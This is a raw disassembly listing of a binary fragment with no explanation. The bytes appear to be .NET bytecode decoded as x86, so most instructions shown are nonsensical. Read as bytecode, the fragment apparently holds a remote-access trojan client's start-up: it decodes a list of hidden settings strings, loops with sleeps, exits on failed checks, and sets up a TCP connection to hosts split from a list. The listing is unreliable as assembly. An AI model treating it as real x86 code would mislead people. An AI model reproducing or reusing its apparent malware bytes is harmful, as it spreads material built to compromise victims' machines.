  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	1d 02 00 70 80       	sbb    $0x80700002,%eax
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	d0 02                	rolb   $1,(%edx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	83 03 00             	addl   $0x0,(%ebx)
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	97                   	xchg   %eax,%edi
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	af                   	scas   %es:(%edi),%eax
  40290a:	03 00                	add    (%eax),%eax
  40290c:	70 80                	jo     0x40288e
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	09 04 00             	or     %eax,(%eax,%eax,1)
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	bc 04 00 70 80       	mov    $0x80700004,%esp
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	bf 16 00 70 80       	mov    $0x80700016,%edi
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	72 1e                	jb     0x402951
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	25 1f 00 70 80       	and    $0x8070001f,%eax
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	d8 1f                	fcomps (%edi)
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	8b 20                	mov    (%eax),%esp
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	8f                   	(bad)
  402960:	20 00                	and    %al,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	42                   	inc    %edx
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 4c 21 00       	add    $0x214c72,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	4c                   	dec    %esp
  402aa0:	21 00                	and    %eax,(%eax)
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 4e 21    	add    %esp,0x214e7216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
